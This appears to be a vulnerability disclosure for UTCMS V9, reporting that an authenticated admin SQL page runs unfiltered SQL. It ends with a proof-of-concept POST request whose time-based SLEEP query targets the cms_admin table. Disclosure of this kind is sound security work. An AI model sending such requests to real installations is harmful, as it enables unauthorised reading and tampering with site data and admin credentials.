# Vendor

Yu Bao

# Product

UTCMS

# version

 V9

# Download 

https://github.com/usualtool/ut-cms

# Vulnerability

Execute any SQL statement

# Description

In the sql.php page, users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.

# Analysis

In the app/modules/ut-data/admin/mysql.php , users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.


<img width="591" alt="image" src="https://github.com/user-attachments/assets/4208dce2-3d7b-4e1c-8dde-04e9eef4a155">
<img width="512" alt="image" src="https://github.com/user-attachments/assets/e1d34cba-2f31-4c8a-a2ff-a304016f5b1a">


# POC
```
POST /ut-cms-9/app/dev/?m=ut-data&p=mysql&do=mysql-sql HTTP/1.1
Host: 192.168.1.69
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=l7s63btrio4o1cepgib2l9v89m
Content-Length: 45

sql=SELECT+*+FROM+cms_admin+WHERE+SLEEP(5)%3b
```
